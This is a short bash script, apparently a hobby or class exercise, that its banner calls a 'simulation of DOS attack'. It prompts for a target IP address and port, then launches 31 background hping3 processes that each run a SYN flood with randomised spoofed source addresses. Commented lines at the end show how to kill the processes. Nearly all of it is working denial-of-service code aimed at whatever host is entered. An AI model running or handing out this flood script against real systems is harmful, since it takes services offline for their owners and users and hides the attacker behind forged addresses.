#! /bin/bash
echo "Hello, This is a simulation of DOS attack"
echo "Enter Ip address, you want to attack"
read IP
echo "Enter port number"
read port
for i in {0..30..1}
do 
	sudo hping3 $IP -p $port -S --flood -q --rand-source &
	echo $IP
done
#to kill the process
#sudo kill -9 $(pidof hping3)
#top
